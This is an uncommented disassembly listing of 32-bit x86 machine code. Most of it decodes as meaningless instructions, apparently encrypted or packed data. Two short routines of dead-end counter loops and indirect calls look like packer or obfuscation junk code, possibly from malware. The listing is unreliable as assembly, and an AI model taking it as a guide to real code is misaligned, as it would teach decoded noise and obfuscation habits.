  406a43:	cmp    ebp,edi
  406a45:	ins    BYTE PTR es:[edi],dx
  406a46:	call   0xe9fc:0x73bb1bed
  406a4d:	xor    esi,esi
  406a4f:	ret    0x9feb
  406a52:	(bad)  
  406a53:	lock mov edx,0x76b00f40
  406a59:	sbb    ebp,DWORD PTR [ecx+edi*8-0x43c0e098]
  406a60:	lea    eax,[ebp+0x3b]
  406a63:	or     DWORD PTR [edx+esi*8+0x5e0db2f4],0xffffff85
  406a6b:	(bad)  
  406a6c:	popf   
  406a6d:	ret    
  406a6e:	sahf   
  406a6f:	ja     0x406a87
  406a71:	dec    eax
  406a72:	mov    bh,0x88
  406a74:	(bad)  
  406a75:	sbb    bl,bh
  406a77:	repz adc DWORD PTR [eax-0x16],0xfffffffd
  406a7c:	mov    edx,0xb66dd01f
  406a81:	repz fistp WORD PTR [ebp*8-0x3ebb1afe]
  406a89:	jb     0x406a7d
  406a8b:	add    eax,0x5362f0cf
  406a90:	leave  
  406a91:	jl     0x406a2b
  406a93:	pop    ebp
  406a94:	jmp    0x95467a94
  406a99:	shr    al,0x9a
  406a9c:	ficomp WORD PTR [eax]
  406a9e:	outs   dx,BYTE PTR ds:[esi]
  406a9f:	mov    esi,0xd7cafa20
  406aa4:	pop    edx
  406aa5:	and    eax,0xa5453bc3
  406aaa:	out    dx,eax
  406aab:	cmp    DWORD PTR [ecx],ebx
  406aad:	or     BYTE PTR [ebx-0x39],ah
  406ab0:	stos   DWORD PTR es:[edi],eax
  406ab1:	cli    
  406ab2:	stos   DWORD PTR es:[edi],eax
  406ab3:	or     eax,0x3d052e98
  406ab8:	or     dh,BYTE PTR [edx-0x4e]
  406abb:	add    al,0x42
  406abd:	push   es
  406abe:	jecxz  0x406ab0
  406ac0:	xor    eax,ecx
  406ac2:	add    eax,0x32729c
  406ac7:	leave  
  406ac8:	ret    0x1c
  406acb:	push   ebp
  406acc:	mov    ebp,esp
  406ace:	sub    esp,0x78
  406ad1:	mov    eax,ds:0x41b1a8
  406ad6:	mov    DWORD PTR [ebp-0x10],eax
  406ad9:	mov    eax,ds:0x41b2b4
  406ade:	sub    DWORD PTR ds:0x42e6fb,0x487f
  406ae8:	mov    DWORD PTR [ebp-0x30],eax
  406aeb:	xor    DWORD PTR ds:0x42fd01,0x6d44
  406af5:	mov    DWORD PTR [ebp-0xc],0xf89c8531
  406afc:	inc    DWORD PTR ds:0x42fcd9
  406b02:	mov    DWORD PTR [ebp-0x14],0xf89c8530
  406b09:	sub    DWORD PTR ds:0x42e6ef,0x7e8e
  406b13:	mov    eax,DWORD PTR [ebp-0xc]
  406b16:	push   ebx
  406b17:	push   esi
  406b18:	push   edi
  406b19:	movzx  esi,WORD PTR ds:0x42fcd9
  406b20:	and    esi,DWORD PTR ds:0x42e128
  406b26:	mov    DWORD PTR ds:0x42fcd9,esi
  406b2c:	mov    esi,0x7510855
  406b31:	mov    DWORD PTR ds:0x42e6f3,0x1a
  406b3b:	cmp    DWORD PTR ds:0x42e6f3,0x0
  406b42:	je     0x406c66
  406b48:	cmp    DWORD PTR ds:0x42e6f3,0x27
  406b4f:	jne    0x406b61
  406b55:	push   DWORD PTR [ebp-0xc]
  406b58:	push   DWORD PTR [ebp-0x24]
  406b5b:	call   DWORD PTR ds:0x42e2df
  406b61:	mov    edi,DWORD PTR ds:0x42e6f3
  406b67:	dec    edi
  406b68:	mov    DWORD PTR ds:0x42e6f3,edi
  406b6e:	jmp    0x406b3b
  406b73:	mov    DWORD PTR ds:0x42fcf1,0x10
  406b7d:	cmp    DWORD PTR ds:0x42fcf1,0x0
  406b84:	je     0x406c66
  406b8a:	cmp    DWORD PTR ds:0x42fcf1,0x1c
  406b91:	jne    0x406bad
  406b97:	push   DWORD PTR [ebp-0x10]
  406b9a:	push   0x42fcfd
  406b9f:	push   0x29f4
  406ba4:	push   DWORD PTR [ebp-0x14]
  406ba7:	call   DWORD PTR ds:0x42e53f
  406bad:	mov    edi,DWORD PTR ds:0x42fcf1
  406bb3:	dec    edi
  406bb4:	mov    DWORD PTR ds:0x42fcf1,edi
  406bba:	jmp    0x406b7d
  406bbf:	and    DWORD PTR ds:0x42fce5,0x0
  406bc9:	jmp    0x406bdb
  406bce:	mov    edi,DWORD PTR ds:0x42fce5
  406bd4:	inc    edi
  406bd5:	mov    DWORD PTR ds:0x42fce5,edi
  406bdb:	cmp    DWORD PTR ds:0x42fce5,0x15
  406be2:	jae    0x406c66
  406be8:	cmp    DWORD PTR ds:0x42fce5,0x1e
  406bef:	jne    0x406c06
  406bf5:	push   DWORD PTR [ebp-0xc]
  406bf8:	push   0x42fced
  406bfd:	push   DWORD PTR [ebp-0x10]
  406c00:	call   DWORD PTR ds:0x42e45b
  406c06:	jmp    0x406bce
  406c0b:	and    DWORD PTR ds:0x42fd76,0x0
  406c15:	mov    edi,DWORD PTR ds:0x42fd76
  406c1b:	inc    edi
  406c1c:	mov    DWORD PTR ds:0x42fd76,edi
  406c22:	cmp    DWORD PTR ds:0x42fd76,0x5
  406c29:	jne    0x406c3f
  406c2f:	push   0x42e707
  406c34:	push   0x42e1a4
  406c39:	call   DWORD PTR ds:0x42e543
  406c3f:	cmp    DWORD PTR ds:0x42fd76,0x4
  406c46:	jne    0x406c59
  406c4c:	mov    edi,DWORD PTR ds:0x42fd76
  406c52:	inc    edi
  406c53:	mov    DWORD PTR ds:0x42fd76,edi
  406c59:	cmp    DWORD PTR ds:0x42fd76,0x1b
  406c60:	jb     0x406c15
  406c66:	xor    eax,esi
  406c68:	sub    DWORD PTR ds:0x42e713,ecx
  406c6e:	mov    edi,0x32729c
  406c73:	add    eax,edi
  406c75:	xor    DWORD PTR ds:0x42e70b,0x42fd76
  406c7f:	mov    DWORD PTR [ebp-0x20],eax
  406c82:	mov    DWORD PTR [ebp-0x28],0xf89cb531
  406c89:	jmp    0x406fd6
  406c8e:	inc    ecx
  406c8f:	jae    0x406d0b
  406c91:	pop    ebp
  406c92:	sub    dh,BYTE PTR [ebp+0x61]
  406c95:	jae    0x406ce4
  406c97:	and    ebp,DWORD PTR [eax]
  406c99:	mov    bh,0xca
  406c9b:	outs   dx,DWORD PTR ds:[esi]
  406c9c:	call   0x2070:0x70c51717
  406ca3:	jge    0x406d15
  406ca5:	jo     0x406ca9
  406ca7:	or     dh,al
  406ca9:	pop    ebp
  406caa:	inc    eax
  406cab:	fadd   QWORD PTR [ebp+0x4ba06b20]
  406cb1:	sti    
  406cb2:	fst    DWORD PTR [ecx+0x18ab9ca4]
  406cb8:	or     al,0x32
  406cba:	pop    es
  406cbb:	in     al,0x70
  406cbd:	mov    edi,ebx
  406cbf:	cmp    DWORD PTR [esi],0x145d4449
  406cc5:	cmp    DWORD PTR [esp+ebx*8+0x24a0209b],esp
  406ccc:	and    al,0x61
  406cce:	cmp    al,0xc6
  406cd0:	inc    eax
  406cd1:	sbb    edi,DWORD PTR [esi]
  406cd3:	inc    edi
  406cd4:	lods   eax,DWORD PTR ds:[esi]
  406cd5:	daa    
  406cd6:	push   esi
  406cd7:	push   ebp
  406cd8:	outs   dx,DWORD PTR ds:[esi]
  406cd9:	jg     0x406cb5
  406cdb:	cs jge 0x406d41
  406cde:	sub    BYTE PTR [ecx+0x7d5b60a7],dh
  406ce4:	aad    0xf4
  406ce6:	mov    edx,0x45fe31f4
  406ceb:	dec    eax
  406cec:	enter  0xce8b,0xd8
  406cf0:	inc    ebx
  406cf1:	jge    0x406c76
  406cf3:	jmp    0xc303f224
  406cf8:	inc    esi
  406cf9:	out    dx,eax
  406cfa:	adc    al,0xde
  406cfc:	add    eax,0xd5023c1d
  406d01:	neg    DWORD PTR [ebx+0x783cc2f0]
  406d07:	outs   dx,DWORD PTR ds:[esi]
  406d08:	push   esp
  406d09:	xor    eax,0x530775ce
  406d0e:	(bad)  
  406d0f:	cmp    al,0xb7
  406d11:	loope  0x406d53
  406d13:	mov    BYTE PTR [edi-0x22],cl
  406d16:	xor    ch,BYTE PTR [esi+eax*1-0x59]
  406d1a:	outs   dx,DWORD PTR ds:[esi]
  406d1b:	sbb    bh,bl
  406d1d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406d1e:	mov    eax,ds:0x9fd2fcb
  406d23:	cs int 0xae
  406d26:	fs push 0xdcfb26af
  406d2c:	outs   dx,BYTE PTR ds:[esi]
  406d2d:	test   eax,0xe22b0a1b
  406d32:	pop    eax
  406d33:	xchg   edx,eax
  406d34:	push   eax
  406d35:	add    ebp,ecx
  406d37:	or     BYTE PTR ds:0x287a8055,cl
  406d3d:	push   eax
  406d3e:	xor    edx,0x3b
  406d41:	or     DWORD PTR [esi+0xd16556a],edi
  406d47:	adc    eax,0xdf2304be
  406d4c:	pop    ecx
  406d4d:	xchg   ebp,eax
  406d4e:	sbb    BYTE PTR [eax-0x23],0xe8
  406d52:	sbb    al,0xd
  406d54:	imul   edi,edi,0xb
  406d57:	retf   
  406d58:	mov    WORD PTR [edi+ecx*1+0x2c],es
  406d5c:	push   esp
  406d5d:	and    bh,dh
  406d5f:	sahf   
  406d60:	cmp    bl,BYTE PTR [esi+ecx*8-0x7c7e0b6e]
  406d67:	xor    cl,al
  406d69:	shl    DWORD PTR ss:[ebx+0x32],cl
  406d6d:	int3   
  406d6e:	mov    bh,0x20
  406d70:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406d71:	ja     0x406d21
  406d73:	add    BYTE PTR [edi],al
  406d75:	inc    ch
  406d77:	pop    ecx
  406d78:	retf   
  406d79:	arpl   WORD PTR [edx+0x5b],sp
  406d7c:	jg     0x406dd1
  406d7e:	sub    al,0xee
  406d80:	xor    eax,0x13f180a5
  406d85:	mov    ds:0xf3d21ba0,al
  406d8a:	loopne 0x406d41
  406d8c:	and    DWORD PTR [edi-0x7bc9f761],0xffffff99
  406d93:	rep lods eax,DWORD PTR ds:[esi]
  406d95:	cmp    BYTE PTR [ecx+0x2fd97b9e],dh
  406d9b:	jmp    0x35cc3003
  406da0:	push   cs
  406da1:	cmp    al,0x63
  406da3:	div    DWORD PTR [ecx+eiz*8+0x2f3f754f]
  406daa:	inc    edx
  406dab:	jne    0x406d95
  406dad:	pop    ecx
  406dae:	scas   eax,DWORD PTR es:[edi]
  406daf:	lock je 0x406d5e
  406db2:	jbe    0x406d78
  406db4:	aam    0xba
  406db6:	and    bl,BYTE PTR [esi]
  406db8:	sub    al,0x6a
  406dba:	lock fdivr QWORD PTR [edx-0x34eb4e40]
  406dc1:	push   es
  406dc2:	cmp    ebx,esp
  406dc4:	mov    ds:0x15ff4486,al
  406dc9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406dca:	xlat   BYTE PTR ds:[ebx]
  406dcb:	out    dx,eax
  406dcc:	sub    al,0x48
  406dce:	rdpmc  
  406dd0:	test   al,0x38
  406dd2:	or     DWORD PTR [ebp+0x61],ecx
  406dd5:	sub    BYTE PTR [esi],0xf3
  406dd8:	fidivr DWORD PTR [ebx+0x43]
  406ddb:	(bad)  
  406ddc:	fstp   DWORD PTR [ebx+0x72]
  406ddf:	mov    WORD PTR [ebx+0x38],cs
  406de2:	cmp    BYTE PTR [eax],0x11
  406de5:	mov    eax,0x869a381b
  406dea:	pop    edx
  406deb:	shl    BYTE PTR [esi],cl
  406ded:	aaa    
  406dee:	cli    
  406def:	ins    DWORD PTR es:[edi],dx
  406df0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406df1:	or     DWORD PTR [edi+0x4a],edx
  406df4:	and    edx,0xba0c90f2
  406dfa:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  406dfc:	xchg   esp,eax
  406dfd:	mov    ds:0xa4002f5b,al
  406e02:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406e03:	push   0x63
  406e05:	jno    0x406dd8
  406e07:	cmp    cl,BYTE PTR [ecx+0x13]
  406e0a:	and    DWORD PTR [ecx+eiz*1],edi
  406e0d:	clc    
  406e0e:	arpl   WORD PTR [ebx],si
  406e10:	cmp    BYTE PTR [eax-0x47f15454],ch
  406e16:	and    DWORD PTR [eax+esi*4],edi
  406e19:	mov    cl,BYTE PTR [edi+ebx*1]
  406e1c:	jp     0x406e5a
  406e1e:	fistp  DWORD PTR [esi]
  406e20:	loop   0x406e03
  406e22:	push   esp
  406e23:	jno    0x406e00
  406e25:	mov    al,ds:0x20ac7fd9
  406e2a:	(bad)
  406e2d:	dec    edx
  406e2e:	scas   al,BYTE PTR es:[edi]
  406e2f:	push   0xb5408a3
  406e34:	or     edi,ebx
  406e36:	das    
  406e37:	sbb    eax,0x135ababf
  406e3c:	in     al,dx
  406e3d:	sbb    eax,edx
  406e3f:	add    BYTE PTR [esi-0x616e1e2],dl
  406e45:	lods   eax,DWORD PTR ds:[esi]
  406e46:	es push edx
  406e48:	sahf   
  406e49:	ss iret 
  406e4b:	xor    BYTE PTR [ebp+0x23caec13],0xa1
  406e52:	in     al,dx
  406e53:	out    0x65,al
  406e55:	fist   WORD PTR [edi+0x38e64dec]
  406e5b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406e5c:	sub    DWORD PTR [edi],ecx
  406e5e:	lods   al,BYTE PTR ds:[esi]
  406e5f:	(bad)  
  406e61:	(bad)  
  406e62:	sub    ah,BYTE PTR [ecx]
  406e64:	jno    0x406e1a
  406e66:	enter  0xa832,0x3a
  406e6a:	add    DWORD PTR [eax+eiz*4],ebx
  406e6d:	or     DWORD PTR [eax-0x10998c20],0x5e1ae64e
  406e77:	fdivr  DWORD PTR [esi+0x6038cbdd]
  406e7d:	popa   
  406e7e:	cs or  al,0xc
  406e81:	lods   al,BYTE PTR ds:[esi]
  406e82:	add    cl,BYTE PTR [ecx+0x38b5318]
  406e88:	xor    al,0xd
  406e8a:	pop    ss
  406e8b:	xor    eax,0xc56c5f2b
  406e90:	xchg   edi,eax
  406e91:	fstp   DWORD PTR [edi*1-0x795004c2]
  406e98:	dec    ebx
  406e99:	push   ss
  406e9a:	in     eax,dx
  406e9b:	(bad)  
  406e9d:	push   0x10418765
  406ea2:	fs ja  0x406f20
  406ea5:	pusha  
  406ea6:	stos   BYTE PTR es:[edi],al
  406ea7:	mov    ebx,0x3dbde5a9
  406eac:	push   ebp
  406ead:	mov    al,ds:0x34997ce3
  406eb2:	push   edi
  406eb3:	adc    BYTE PTR [ebx],bh
  406eb5:	scas   eax,DWORD PTR es:[edi]
  406eb6:	divps  xmm6,XMMWORD PTR [ebp-0x68]
  406eba:	mov    edx,0x1a9482fc
  406ebf:	push   eax
  406ec0:	bound  esi,QWORD PTR [edx+0x3b88155a]
  406ec6:	iret   
  406ec7:	(bad)
  406eca:	lods   eax,DWORD PTR ds:[esi]
  406ecb:	adc    BYTE PTR [edi-0x78],bh
  406ece:	lock nop
  406ed0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406ed1:	popf   
  406ed2:	int3   
  406ed3:	dec    esi
  406ed4:	dec    ebp
  406ed5:	xlat   BYTE PTR ds:[ebx]
  406ed6:	sar    DWORD PTR [ebx],1
  406ed8:	scas   al,BYTE PTR es:[edi]
  406ed9:	jmp    0x406f00
  406edb:	sbb    al,0xb2
  406edd:	jle    0x406e9c
  406edf:	jl     0x406ed4
  406ee1:	sbb    ebp,DWORD PTR [edx+esi*2-0x457abc22]
  406ee8:	inc    ebx
  406ee9:	inc    ebp
  406eea:	ins    BYTE PTR es:[edi],dx
  406eeb:	and    BYTE PTR ds:[esi+edx*8-0x69bf2c2d],cl
  406ef3:	les    ecx,FWORD PTR [edx+0x7f]
  406ef6:	and    al,0x54
  406ef8:	int3   
  406ef9:	outs   dx,BYTE PTR ds:[esi]
  406efa:	jg     0x406eef
  406efc:	clc    
  406efd:	xlat   BYTE PTR ds:[ebx]
  406efe:	out    dx,al
  406eff:	inc    ebx
  406f00:	jnp    0x406f06
  406f02:	add    ch,BYTE PTR [ecx-0x2125faaa]
  406f08:	cmp    eax,0x9e0a6852
  406f0d:	xor    cl,cl
  406f0f:	cmp    al,0x37
  406f11:	sub    al,0xa6
  406f13:	fadd   DWORD PTR [ebp+0x58ab4a3d]
  406f19:	js     0x406ed6
  406f1b:	fs dec ecx
  406f1d:	inc    eax
  406f1e:	xchg   ebp,eax
  406f1f:	jg     0x406f6d
  406f21:	mov    dh,BYTE PTR [edi]
  406f23:	dec    ebx
  406f24:	mov    edi,ebp
  406f26:	or     DWORD PTR [esi+eiz*8-0x5d13c94f],0x49
  406f2e:	rcr    DWORD PTR [edi+0x1f],1
  406f31:	in     eax,dx
  406f32:	mov    BYTE PTR [ebp-0x36b6c18a],0x12
  406f39:	jo     0x406f87
  406f3b:	ret    0xeaa7
  406f3e:	and    edx,DWORD PTR fs:[esi]
  406f41:	fldenv gs:[esi]
  406f44:	ds dec ecx
  406f46:	lds    edx,FWORD PTR ds:0x67fe3b13
  406f4c:	pop    ebp
  406f4d:	pop    es
  406f4e:	pop    ebp
  406f4f:	sbb    bl,BYTE PTR [edi]
  406f51:	and    al,0x18
  406f53:	js     0x406f4c
  406f55:	and    dl,0x51
  406f58:	pop    esp
  406f59:	clc    
  406f5a:	cmp    DWORD PTR [edi+0x34adf3a6],ebx
  406f60:	jmp    0x22101002
  406f65:	std    
  406f66:	mov    esi,0x636f1585
  406f6b:	inc    edi
  406f6c:	inc    ebp
  406f6d:	xlat   BYTE PTR ds:[ebx]
  406f6e:	stc    
  406f6f:	repnz retf 0x2da6
  406f73:	add    al,cl
  406f75:	lahf   
  406f76:	adc    al,0x11
  406f78:	repz xor ecx,DWORD PTR [edi+0xb]
  406f7c:	push   ebx
  406f7d:	pop    edi
  406f7e:	(bad)  
  406f7f:	and    DWORD PTR [ebp-0x52],esi
  406f82:	retf   
  406f83:	je     0x406fde
  406f85:	mov    ebx,0x4defa1aa
  406f8a:	dec    edx
  406f8b:	jl     0x406f4f
  406f8d:	sub    DWORD PTR [ebx+0x408fbd8b],eax
  406f93:	dec    edx
  406f94:	call   0x2e1f:0x85ccc264
  406f9b:	repnz clc 
  406f9d:	push   esi
  406f9e:	loop   0x406f73
  406fa0:	cmp    eax,0xe5e108c4
  406fa5:	and    BYTE PTR [eax+0x65b96ce3],cl
  406fab:	push   cs
  406fac:	in     al,dx
  406fad:	and    cl,BYTE PTR [edi-0xb13f9d9]
  406fb3:	sub    BYTE PTR ds:0xa2ef942d,bl
  406fb9:	or     ah,BYTE PTR [ebx+0xa2e96fc]
  406fbf:	bnd jo 0x406f60
  406fc2:	sbb    DWORD PTR [esi+0x1d],0x7969a88f
  406fc9:	jbe    0x406fe8
  406fcb:	xchg   dl,cl
  406fcd:	pop    edx
  406fce:	mov    cl,BYTE PTR cs:[edi+eiz*4-0xa4f3c04]
  406fd6:	mov    DWORD PTR [ebp-0x34],0xf89f0531
  406fdd:	adc    DWORD PTR ds:0x42fd72,0x42e70b
  406fe7:	mov    DWORD PTR [ebp-0x2c],0xf89c85f1
  406fee:	mov    DWORD PTR [ebp-0x24],0xf89c85d1
  406ff5:	add    eax,0xac
  406ffa:	jmp    0x407347
  406fff:	sbb    al,0x75
  407001:	sar    DWORD PTR [esi+0x71b35a51],1
  407007:	lahf   
  407008:	popa   
  407009:	sti    
  40700a:	arpl   cx,bp
  40700c:	cmp    eax,0xc2c78eb3
  407011:	jo     0x407083
  407013:	and    BYTE PTR [ebp+0x70],bh
  407016:	jo     0x40705b
  407018:	ins    BYTE PTR es:[edi],dx
  407019:	outs   dx,BYTE PTR ds:[esi]
  40701a:	js     0x40702e
  40701c:	mov    ebp,edx
  40701e:	mov    ds:0xb7b5522d,al
  407023:	and    eax,ebx
  407025:	imul   edi,edx,0xffffffdc
  407028:	mov    ecx,0x40a77f17
  40702d:	pop    esi
  40702e:	cwde   
  40702f:	outs   dx,BYTE PTR ds:[esi]
  407030:	scas   al,BYTE PTR es:[edi]
  407031:	mov    ebp,0x4a88230
  407036:	call   0x1fe3:0xce3dbce5
  40703d:	cs call 0x1d99509e
  407043:	cmp    ah,0x71
  407046:	pop    ecx
  407047:	(bad)  
  407048:	mov    esp,0x2e28013c
  40704d:	enter  0xbac5,0xbb
  407051:	addr16 call 0x3b424ee3
  407057:	mov    ebp,0x5cb94175
  40705c:	lods   eax,DWORD PTR ds:[esi]
  40705d:	mov    DWORD PTR [eax+0x53],ecx
  407060:	xchg   ecx,eax
  407061:	cmp    eax,0x1062ca1
  407066:	bound  ebx,QWORD PTR [esi-0x3be2e7f5]
  40706c:	jae    0x4070b1
  40706e:	cmp    eax,0xfc48c5b5
  407073:	dec    esi
  407074:	rol    ebp,0x12
  407077:	pop    ecx
  407078:	mov    BYTE PTR [ebp-0x7b],ch
  40707b:	mov    eax,0x8e8b782
  407080:	ds mov cl,0xcb
  407083:	and    eax,0xe0395aa
  407088:	(bad)  
  407089:	pop    ebp
  40708a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40708b:	out    dx,al
  40708c:	hlt    
  40708d:	mov    bh,0xd8
  40708f:	and    DWORD PTR [edx+0x57],esp
  407092:	inc    ebp
  407093:	or     al,BYTE PTR [edx+ebp*8+0x47]
  407097:	mov    ebx,0x95933496
  40709c:	in     al,dx
  40709d:	inc    edx
  40709f:	mov    edx,0x80add08b
  4070a4:	imul   eax,DWORD PTR [ecx],0xd74d5d2b
  4070aa:	test   eax,0xa178099d
  4070af:	push   eax
  4070b0:	(bad)  
  4070b2:	and    ebp,DWORD PTR [ecx+0x70]
  4070b5:	push   eax
  4070b6:	mov    edx,0x2423a0d2
  4070bb:	mov    ds,WORD PTR [esi]
  4070bd:	sbb    BYTE PTR [ecx-0x54],dh
  4070c0:	test   BYTE PTR [esi],al
  4070c2:	rol    ecx,0x65
  4070c5:	xor    al,0xe
  4070c7:	add    dh,BYTE PTR [eax-0x73bdb37e]
  4070cd:	jecxz  0x4070f5
  4070cf:	dec    esi
  4070d0:	(bad)  
  4070d1:	lods   eax,DWORD PTR ds:[esi]
  4070d2:	jg     0x4070cc
  4070d4:	fcmovu st,st(1)
  4070d6:	jecxz  0x4070d5
  4070d8:	push   0x10
  4070da:	jmp    FWORD PTR [eax]
  4070dc:	xchg   ebx,edx
  4070de:	shl    BYTE PTR [eax+0x6918c576],0xa8
  4070e5:	fdiv   QWORD PTR [ecx+0x2b]
  4070e8:	xor    dh,BYTE PTR [ecx-0x3e13c49b]
  4070ee:	es (bad) 
  4070f0:	and    ebx,DWORD PTR ds:0x859098c0
  4070f6:	mov    dh,0x62
  4070f8:	xchg   BYTE PTR [esi-0x598a5c88],bl
  4070fe:	sahf   
  4070ff:	inc    ebp
  407100:	and    bl,BYTE PTR [eax]
  407102:	enter  0x88e2,0x9f
  407106:	push   0xffffffac
  407108:	pusha  
  407109:	adc    DWORD PTR ds:0xe75433f4,esp
  40710f:	and    ebx,DWORD PTR [edi+0x50]
  407112:	call   0x72dfe246
  407117:	pop    eax
  407118:	sub    cl,BYTE PTR [eax+0x15]
  40711b:	ja     0x407169
  40711d:	sub    BYTE PTR [ebp+0x4132cc46],al
  407123:	rol    dl,cl
  407125:	mov    al,0xa3
  407127:	adc    WORD PTR [esi],si
  40712a:	js     0x40713e
  40712c:	aas    
  40712d:	mov    bh,0x11
  40712f:	dec    BYTE PTR [ebx]
  407131:	test   al,0xf5
  407133:	fadd   DWORD PTR [ebp+0x36]
  407136:	pmaxsw mm2,QWORD PTR [ebx]
  407139:	fidiv  DWORD PTR [edi-0x6a]
  40713c:	jnp    0x40717f
  40713e:	shr    BYTE PTR [eax-0x1f70dd33],cl
  407144:	sbb    al,0xf4
  407146:	fldcw  WORD PTR [edi]
  407148:	xor    dh,dl
  40714a:	push   esp
  40714b:	and    al,0x66
  40714d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40714e:	test   eax,0xfdcc65c8
  407153:	(bad)  
  407155:	or     DWORD PTR [edx+0x28216292],esi
  40715b:	(bad)  
  40715d:	ficom  WORD PTR [esi+0x49]
  407160:	addr16 sar edi,1
  407163:	leave  
  407164:	int    0x43
  407166:	pop    edx
  407167:	and    al,0x5e
  407169:	mov    dl,0x6a
  40716b:	mov    ch,0x9
  40716d:	lock loope 0x407161
  407170:	xor    cl,0x79
  407173:	xor    eax,0x788ea417
  407178:	mov    DWORD PTR [esp+ecx*2],eax
  40717b:	imul   DWORD PTR [edx-0x3cac1b23]
  407181:	cli    
  407182:	in     al,0xa0
  407184:	push   esi
  407185:	and    BYTE PTR [esi+0x7285c826],bh
  40718b:	test   eax,0x736b8caf
  407190:	pop    es
  407191:	popf   
  407192:	sbb    cl,BYTE PTR [ecx]
  407194:	inc    ecx
  407195:	(bad)  
  407196:	mov    ecx,0x7097bf7f
  40719b:	mov    ebp,0x8f9dddc6
  4071a0:	shl    al,1
  4071a2:	mov    ds:0x28d73823,al
  4071a7:	pop    ebp
  4071a8:	or     bh,BYTE PTR ds:0x36cd2cb8
  4071ae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4071af:	fdivr  QWORD PTR [edx+0x5312716f]
  4071b5:	enter  0xcf31,0x6d
  4071b9:	mov    al,0x20
  4071bb:	jge    0x4071ba
  4071bd:	or     BYTE PTR [ebp+0x16cd740b],al
  4071c3:	pushf  
  4071c4:	cmp    BYTE PTR [edi+0x7c],bh
  4071c7:	or     al,0x48
  4071c9:	stos   DWORD PTR es:[edi],eax
  4071ca:	es fdivr st,st(0)
  4071cd:	fcom   QWORD PTR [esi+0x2d]
  4071d0:	add    DWORD PTR [ebx-0x6],ebx
  4071d3:	jo     0x407171
  4071d5:	imul   edx,DWORD PTR [ebp+ebp*4+0x281fd621],0x8d2bbe55
  4071e0:	and    BYTE PTR [eax],0x70
  4071e3:	lahf   
  4071e4:	test   ecx,0x44aa2645
  4071ea:	ins    DWORD PTR es:[edi],dx
  4071eb:	jl     0x407231
  4071ed:	mov    ebp,0xbe50cf8b
  4071f2:	cmp    eax,0x96541fe3
  4071f7:	jmp    0xd9526eb4
  4071fc:	mov    ebp,fs
  4071fe:	cmc    
  4071ff:	inc    eax
  407200:	cld    
  407201:	cwde   
  407202:	mov    cl,0x6
  407204:	fndisi(8087 only) 
  407206:	in     eax,dx
  407207:	adc    al,0xba
  407209:	jae    0x407224
  40720b:	push   esp
  40720c:	push   eax
  40720d:	or     cl,BYTE PTR [eax+0x28]
  407210:	and    DWORD PTR [esp+edi*2],esp
  407213:	mov    eax,0xf4107978
  407218:	push   ebx
  407219:	xlat   BYTE PTR ds:[ebx]
  40721a:	shl    BYTE PTR [edi],cl
  40721c:	das    
  40721d:	pushf  
  40721e:	pushf  
  40721f:	sbb    eax,0x28f72d4a
  407224:	dec    ecx
  407225:	imul   edx,DWORD PTR [edx],0x14
  407228:	lock es mov al,0x89
  40722c:	jb     0x4071d7
  40722e:	push   esi
  40722f:	inc    ebx
  407230:	xchg   ebp,eax
  407231:	sahf   
  407232:	sbb    eax,esi
  407234:	xchg   esp,eax
  407235:	pop    ds
  407236:	add    eax,0xbc2125cb
  40723b:	repnz pop edi
  40723d:	dec    esi
  40723e:	fwait
  40723f:	cmp    edx,eax
  407241:	cli    
  407242:	hlt    
  407243:	inc    ebp
  407244:	out    0x1c,al
  407246:	arpl   sp,si
  407248:	jmp    0xceb7:0xb2f8460f
  40724f:	lods   eax,DWORD PTR ds:[esi]
  407250:	push   cs
  407251:	mov    ds:0xc1d6f775,al
  407256:	cwde   
  407257:	int    0xe9
  407259:	mov    eax,ds:0x9eafdd63
  40725e:	jno    0x4072c3
  407260:	loope  0x40721b
  407262:	sahf   
  407263:	inc    DWORD PTR [edx]
  407265:	cwde   
  407266:	inc    esi
  407267:	push   ebx
  407268:	mov    ds:0x53fe064e,al
  40726d:	mov    edx,0xd3739211
  407272:	pop    esp
  407273:	or     esi,DWORD PTR [edi+0x6d]
  407276:	mov    esi,ebx
  407278:	aas    
  407279:	pop    ecx
  40727a:	sbb    dh,BYTE PTR [esi-0x654b667c]
  407280:	fst    QWORD PTR [edx+0x1f]
  407283:	dec    ecx
  407284:	jle    0x40722b
  407286:	arpl   WORD PTR [edx+edx*1-0x63],sp
  40728a:	pushf  
  40728b:	mov    eax,0xb6894173
  407290:	mov    ebx,0xf29633e0
  407295:	(bad)  
  407297:	loopne 0x407235
  407299:	cwde   
  40729a:	enter  0x3ee2,0x26
  40729e:	dec    ecx
  40729f:	aas    
  4072a0:	dec    eax
  4072a1:	in     eax,dx
  4072a2:	out    0x5b,al
  4072a4:	dec    dh
  4072a6:	icebp  
  4072a7:	or     eax,esp
  4072a9:	(bad)  
  4072aa:	mov    esp,0x4acb5316
  4072af:	fwait
  4072b0:	sbb    ch,al
  4072b2:	jae    0x407252
  4072b4:	dec    esp
  4072b5:	push   cs
  4072b6:	pop    es
  4072b7:	dec    esp
  4072b8:	push   edx
  4072b9:	inc    edi
  4072ba:	lods   al,BYTE PTR ds:[esi]
  4072bb:	or     ah,BYTE PTR [ebx+0x54]
  4072be:	inc    edx
  4072bf:	pop    ss
  4072c0:	rol    DWORD PTR [ebx],1
  4072c2:	pop    edx
  4072c3:	lods   eax,DWORD PTR ds:[esi]
  4072c4:	pop    edx
  4072c5:	cwde   
  4072c6:	jl     0x407268
  4072c8:	push   ebx
  4072c9:	jnp    0x40727b
  4072cb:	and    eax,0xab4d57fc
  4072d0:	adc    BYTE PTR [edi-0x4e],ah
  4072d3:	mov    ecx,0x94ebab59
  4072d8:	or     eax,0xa2a36f4d
  4072dd:	test   BYTE PTR [ecx+0x50],0x8c
  4072e1:	iret   
  4072e2:	xor    ebx,DWORD PTR ds:0x406cd106
  4072e8:	cmp    esi,DWORD PTR [edx-0x14]
  4072eb:	(bad)  
  4072ed:	cmp    bl,ch
  4072ef:	xchg   ecx,eax
  4072f0:	jae    0x407296
